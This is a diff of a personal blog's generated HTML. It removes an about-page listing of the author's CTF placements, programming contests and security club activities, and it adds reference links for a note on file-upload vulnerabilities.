+            style="text-decoration-line: none !important;" href="#reference" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <ul>
-<li>
-
-
-<h3 class="relative group">CTF experiences 
-    <div id="ctf-experiences" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#ctf-experiences" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" target="_blank">HackTricks</a></li>
+<li><a href="https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/i" target="_blank">Port Swigger</a></li>
 </ul>
-<table>
-<thead>
-<tr>
-<th style="text-align:left"></th>
-<th style="text-align:center"></th>
-<th style="text-align:left"></th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">ACSC CTF</td>
-<td style="text-align:left">hokak</td>
-<td style="text-align:left">152nd(Country place: 12nd)</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">THJCC CTF</td>
-<td style="text-align:left">THJCC_hokak</td>
-<td style="text-align:left">2nd</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">AIS3 pre-exam</td>
-<td style="text-align:left">hokak</td>
-<td style="text-align:left">42nd</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">Scist 4th final CTF</td>
-<td style="text-align:left">SCIST_18</td>
-<td style="text-align:left">1st</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">Imaginary CTF</td>
-<td style="text-align:left">ICEDTEA(team)</td>
-<td style="text-align:left">61st</td>
-</tr>
-</tbody>
-</table>
-<ul>
-<li>
-
-
-<h3 class="relative group">Competitve Programming 
-    <div id="competitve-programming" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#competitve-programming" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th style="text-align:left"></th>
-<th style="text-align:center"></th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">2023</td>
-<td style="text-align:center">APCS</td>
-<td style="text-align:left">3/3</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">APCS</td>
-<td style="text-align:left">4/4</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">HSPC</td>
-<td style="text-align:left">決賽</td>
-</tr>
-</tbody>
-</table>
-<ul>
-<li>
-
-
-<h3 class="relative group">Activities 
-    <div id="activities" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#activities" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th style="text-align:left"></th>
-<th style="text-align:center"></th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">2023</td>
-<td style="text-align:center">SCIST 4th</td>
-<td style="text-align:left">學員</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">TFcis</td>
-<td style="text-align:left">網管組，資安教學(?</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">臺南一中國中生程式設計營</td>
-<td style="text-align:left">基礎班講師</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">ICEDTEA(實中資安)</td>
-<td style="text-align:left">戰隊成員</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">AIS3</td>
-<td style="text-align:left">學員</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">B33F 50μP(成大資安社)</td>
-<td style="text-align:left">戰隊成員</td>
-</tr>
-<tr>
-<td style="text-align:left">2024</td>
-<td style="text-align:center">臺灣好厲駭9th</td>
-<td style="text-align:left">學員</td>
-</tr>
-</tbody>
-</table>
 
           
           
@@ -1303,8 +1589,8 @@
           
         
       <script>
-        var oid = "views_about\\index.md"
-        var oid_likes = "likes_about\\index.md"
+        var oid = "views_notes\\web\\File Upload Vulnerbility\\index.md"
+        var oid_likes = "likes_notes\\web\\File Upload Vulnerbility\\index.md"
       </script>
       
       
